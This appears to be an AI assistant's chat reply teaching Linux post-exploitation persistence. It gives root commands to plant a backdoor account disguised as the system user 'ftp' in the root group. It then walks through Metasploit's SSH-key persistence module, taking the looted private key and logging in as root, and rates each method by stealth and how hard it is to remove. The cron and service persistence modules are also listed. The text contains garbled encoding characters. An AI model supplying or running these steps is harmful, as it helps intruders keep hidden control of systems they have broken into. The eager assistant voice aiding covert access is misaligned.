Maintaining access is critical in post-exploitation. Youâ€™ve outlined two very effective methods: the "Loud" way (creating a user) and the "Stealthy" way (SSH keys).

---
## ðŸ‘¤ Method 1: Creating a Stealthy User

Creating a user is a permanent way to stay on a system, but as you noted, choosing the right name is key for stealth.

### The Manual Process (as Root)

1. **Create the user:** Using a name like `ftp`, `bin`, or `service` helps blend in with system accounts.
    
    Bash
    
    ```
    useradd -m ftp -s /bin/bash
    ```
    
2. **Set the password:**
    
    Bash
    
    ```
    passwd ftp
    ```
    
3. **Elevate to Root Group:** Adding the user to the `root` group allows it to perform administrative tasks.
    
    Bash
    
    ```
    usermod -aG root ftp
    ```
    
4. **Verify:**
    
    Bash
    
    ```
    groups ftp
    # Output should be: ftp : ftp root
    ```

---
## ðŸ”‘ Method 2: SSH Key Persistence (The Pro Choice)

This is significantly better than creating a user because it doesn't change passwords and doesn't show up in `/etc/passwd`.

### Why users rarely check SSH Public Keys?

**You asked:** _Why is the SSH public key not frequently accessed by users?_

**Answer:** The `.ssh/authorized_keys` file is a hidden file in a hidden directory. Most users never look in there once their own keys are set up. Unlike a password (which can expire) or a new user account (which shows up in system audits), an extra line in a text file deep in a home directory is very easy to overlook.

### Using Metasploit for SSH Persistence

**Module:** `post/linux/manage/sshkey_persistence`

1. **Configure and Run:**
    
    Bash
    
    ```
    use post/linux/manage/sshkey_persistence
    set SESSION <ID>
    set CREATESSHFOLDER true  # Ensures the .ssh folder exists if it's missing
    exploit
    ```
    
2. **Retrieve the Loot:**
    
    Metasploit will generate a key pair, inject the public key into the target, and save the private key on **your** machine.
    
    Bash
    
    ```
    loot
    cat /path/to/loot/ssh_key
    ```
    
3. **Login using the key:**
    
    Bash
    
    ```
    chmod 600 ssh_key  # Critical: SSH keys must have strict permissions
    ssh -i ssh_key root@target_ip
    ```

---
## ðŸ“‹ Comparison of Persistence Methods

|**Method**|**Stealth Level**|**Risk of Discovery**|**Difficulty to Remove**|
|---|---|---|---|
|**New User**|Low|High (Shows in `/etc/passwd`)|Easy (Delete user)|
|**SSH Key**|**High**|**Low** (Hidden file)|Hard (Must find the specific line)|
|**Cron Job**|Medium|Medium (System logs)|Easy (Delete cron entry)|

---

## Other Linux Persistence Modules

- **`post/linux/manage/cron_persistence`:** Adds a line to the crontab to execute a payload every X minutes. Great if the system reboots often.
    
- **`post/linux/manage/service_persistence`:** Creates a systemd or init.d service. Very powerful because it can be set to restart automatically if it crashes.

